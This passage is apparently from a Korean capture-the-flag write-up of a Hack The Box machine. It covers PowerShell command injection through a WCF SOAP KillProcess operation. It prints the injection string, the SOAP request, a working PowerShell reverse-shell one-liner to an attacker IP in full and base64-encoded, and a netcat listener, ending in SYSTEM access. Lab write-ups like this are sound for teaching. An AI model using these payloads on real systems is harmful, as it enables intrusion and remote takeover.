이후 해당 문자열은 `AddScript()` 를 통해 PowerShell 스크립트로 Pipeline에 추가된다:

```cs
val2.Commands.AddScript(text);
```

그리고 `Invoke()` 를 호출하면서 Pipeline에 추가된 PowerShell 명령이 실제로 실행된다:

```cs
Collection<PSObject> collection = val2.Invoke();
```

문제는 `processName` 값이 PowerShell 명령어 문자열에 그대로 삽입된다는 점이다. 

PowerShell에서 `;` 는 명령 구분자로 사용되며, `#` 은 주석을 의미한다. 

따라서 `processName` 값에 다음과 같은 문자열을 전달하면 최종적으로 생성되는 PowerShell 명령은 다음과 같다:

```powershell
Stop-Process -Name notpead; whoami # -Force
```

이 경우 먼저 `notepad` 프로세스 종료를 시도한 뒤, 이어서 `whoami` 명령이 실행된다. 또한 `#` 뒤의 `-Force` 옵션은 주석 처리되어 무시된다.

즉 이 함수는 사용자 입력을 PowerShell 스크립트에 직접 삽입한 뒤 실행하므로, **PowerShell Command Injection**이 가능하다.

이후 `IMonitoringService.cs` 파일을 확인해보면 다음과 같이 `KillProcess` 함수가 WCF operation으로 노출되어 있는 것을 확인할 수 있다:

```cs
using System.ServiceModel;

[ServiceContract]
public interface IMonitoringService
{
        [OperationContract]
        string StartMonitoring();

        [OperationContract]
        string StopMonitoring();

        [OperationContract]
        string KillProcess(string processName);
}
```

이는 앞서 WSDL에서 확인한 KillProcess operation과 대응된다. 

또한 `KillProcess` 는 `processName` 인자를 받기 때문에, SOAP 요청에서 `<KillProcess>` operation을 호출하고 `<processName>` 값에 Command Injection payload를 전달하면 서버 측에서 임의 명령 실행이 가능하다.

## Command Injection Exploitation

Burp Suite를 이용해 `KillProcess` operation을 호출하는 SOAP 요청을 구성하였다.

먼저 WSDL에서 확인한 `KillProcess` operation의 `SOAPAction` 값을 HTTP 헤더에 추가하였다:

```text
SOAPAction: http://tempuri.org/IMonitoringService/KillProcess
```

또한 SOAP 요청 body가 XML 형식이므로 `Content-Type` 을 다음과 같이 설정하였다:

```text
Content-Type: text/xml; charset=utf-8
```

이후 `processName` 파라미터에 Command Injection payload를 삽입하여 요청을 전송하였다:

```xml
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; whoami #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
```

응답 결과에서 `nt authority\system` 이 출력되는 것을 확인할 수 있었다:

![Overwatch](/assets/htb-windows/overwatch/whoami.png)

현재 취약점은 `processName` 값이 PowerShell 스크립트 내부에 직접 삽입되는 구조이므로, 최종 payload 역시 PowerShell 명령 형태로 전달되어야 한다.

따라서 리버스 셸 PowerShell payload를 생성한 뒤, PowerShell의 `-EncodedCommand` 옵션 형식에 맞추기 위해 **UTF-16LE 기반 Base64 인코딩**을 수행하였다:

```bash
$ printf '%s' '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.174",9002);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f utf-8 -t utf-16le | base64 -w 0 

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADQAIgAsADkAMAAwADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

로컬 터미널에서 Netcat 리스너를 실행하였다:

```bash
$ nc -lvnp 9002
```

이후 Burp Suite에서 `processName` 값에 아래 형태의 payload를 삽입하여 요청을 전송하였다:

```xml
<processName>notepad; powershell -e <BASE64_PAYLOAD> #</processName>
```

그 결과 `SYSTEM` 권한의 리버스 셸을 획득할 수 있었다:

![Overwatch](/assets/htb-windows/overwatch/system-shell.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![Overwatch](/assets/htb-windows/overwatch/flag.png)


